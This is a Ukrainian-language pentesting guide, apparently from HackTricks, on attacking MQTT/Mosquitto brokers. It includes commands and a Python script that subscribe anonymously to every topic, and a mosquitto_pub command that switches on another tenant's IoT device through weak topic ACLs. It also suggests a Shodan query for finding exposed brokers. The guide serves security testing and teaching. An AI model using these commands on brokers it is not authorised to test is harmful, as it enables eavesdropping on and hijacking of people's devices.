# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## Основна інформація

**MQ Telemetry Transport (MQTT)** відомий як **publish/subscribe messaging protocol**, який вирізняється надзвичайною простотою та легкістю. Цей протокол спеціально адаптований для середовищ, де пристрої мають обмежені можливості та працюють у мережах із низькою пропускною здатністю, великою затримкою або ненадійним з'єднанням. Основні цілі MQTT включають мінімізацію використання мережевого трафіку та зниження навантаження на ресурси пристрою. Додатково він спрямований на підтримку надійної комунікації та забезпечення певного рівня гарантії доставки. Ці завдання роблять MQTT особливо придатним для зростаючої сфери **machine-to-machine (M2M) communication** та **Internet of Things (IoT)**, де важливо ефективно підключати велику кількість пристроїв. Крім того, MQTT надзвичайно корисний для мобільних застосунків, де критично збереження трафіку та заряду батареї.

**Порт за замовчуванням:** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## Інспекція трафіку

Коли **CONNECT** пакет отримується MQTT-брокерами, назад відправляється **CONNACK** пакет. Цей пакет містить код повернення, який є критично важливим для розуміння статусу з'єднання. Код повернення **0x00** означає, що credentials були прийняті, що свідчить про успішне підключення. Натомість код повернення **0x05** вказує, що credentials недійсні, і з'єднання не відбувається.

Наприклад, якщо брокер відхиляє з'єднання через недійсні credentials, сценарій виглядатиме приблизно так:
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

**Аутентифікація є повністю необов'язковою**, і навіть якщо виконується аутентифікація, **шифрування за замовчуванням не використовується** (облікові дані надсилаються у відкритому вигляді). MITM-атаки все ще можуть бути виконані для викрадення паролів.

Щоб підключитися до MQTT сервісу, ви можете використати: [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell) і підписатися на всі теми, виконавши:
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
Ви також можете використати [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)

Ви також можете використати:
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
Або ви можете **запустити цей код, щоб спробувати підключитися до MQTT-сервісу без аутентифікації, підписатися на всі топіки та прослуховувати їх**:
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### Модель Publish/Subscribe <a href="#b667" id="b667"></a>

Модель publish/subscribe складається з:

- **Publisher**: публікує повідомлення в одну або кілька тем у брокері.
- **Subscriber**: підписується на одну або кілька тем у брокері та отримує всі повідомлення, надіслані видавцем.
- **Broker**: маршрутизує всі повідомлення від видавців до підписників.
- **Topic**: складається з одного або більше рівнів, розділених слешем (наприклад, /smartshouse/livingroom/temperature).

### Формат пакета <a href="#f15a" id="f15a"></a>

Кожен MQTT-пакет містить фіксований заголовок (Figure 02).Рисунок 02: Фіксований заголовок

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### Типи пакетів

- CONNECT (1): Ініційований клієнтом для запиту підключення до сервера.
- CONNACK (2): Підтвердження сервера про успішне підключення.
- PUBLISH (3): Використовується для відправки повідомлення від клієнта до сервера або навпаки.
- PUBACK (4): Підтвердження отримання PUBLISH-пакета.
- PUBREC (5): Частина протоколу доставки повідомлень, що гарантує отримання повідомлення.
- PUBREL (6): Подальше підтвердження доставки, яке вказує на release повідомлення.
- PUBCOMP (7): Остання частина протоколу доставки, що вказує на завершення.
- SUBSCRIBE (8): Запит клієнта підписатися на повідомлення з теми.
- SUBACK (9): Підтвердження сервера запиту SUBSCRIBE.
- UNSUBSCRIBE (10): Запит клієнта припинити отримання повідомлень з теми.
- UNSUBACK (11): Відповідь сервера на запит UNSUBSCRIBE.
- PINGREQ (12): Повідомлення heartbeat, відправлене клієнтом.
- PINGRESP (13): Відповідь сервера на heartbeat-повідомлення.
- DISCONNECT (14): Ініційовано клієнтом для завершення підключення.
- Два значення, 0 і 15, позначені як зарезервовані, їх використання заборонено.

## IoT MQTT ecosystem attacks: нешифровані брокери та обхід ACL тем

Багато споживчих IoT платформ відкривають доступ до MQTT-брокерів, які використовуються двома різними ролями:
- Пристрої-шлюзи/хаби, що мостять радіопротоколи (e.g., BLE/LoRa/Zigbee) до хмари.
- Мобільні додатки або веб-бекенди, що керують пристроями через “app” теми.

Поширені вразливості, якими можна зловживати під час pentest:

- Нешифрований MQTT по нестандартних портах (наприклад, TCP/8001) замість MQTTS. Будь-який on-path спостерігач може прочитати облікові дані та контрольні кадри. Використовуйте Wireshark, щоб виявити відкритий текст CONNECT/CONNACK та SUBSCRIBE/PUBLISH трафік на незвичних портах.
- Слабкі або відсутні ACL тем на рівні орендаря. Якщо теми іменуються лише за deviceId (наприклад, "/tenantless/<deviceId>/tx"), будь-який автентифікований користувач може PUBLISH до пристроїв інших орендарів.
- Витік конфіденційних даних через maintenance/admin теми (наприклад, Wi‑Fi облікові дані транслюються у відкритому тексті після змін конфігурації).

Приклади (замініть заповнювачі на реальні значення):

Підпишіться на потенційно конфіденційні теми з відомими префіксами тем і ID пристроїв:
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
Перехресний контроль між тенантами, коли ACLs слабкі (публікація в тему пристрою іншого тенанта):
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- MQTT у відкритому тексті на нестандартних портах є поширеним у IoT. Розгляньте пошук брокерів на альтернативних портах та підтвердіть це за допомогою виявлення протоколу.

## Посилання

- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
